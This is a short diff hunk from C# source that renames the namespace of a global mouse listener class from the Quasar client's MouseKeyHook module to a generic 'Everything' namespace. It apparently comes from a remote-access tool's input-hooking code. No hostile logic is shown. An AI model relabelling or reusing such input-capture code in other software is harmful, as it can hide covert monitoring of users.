@@ -4,10 +4,10 @@
 
 using System;
 using System.Windows.Forms;
-using Quasar.Client.MouseKeyHook.WinApi;
+using Everything.MouseKeyHook.WinApi;
 using Quasar.Client.Utilities;
 
-namespace Quasar.Client.MouseKeyHook.Implementation
+namespace Everything.MouseKeyHook.Implementation
 {
     internal class GlobalMouseListener : MouseListener
     {
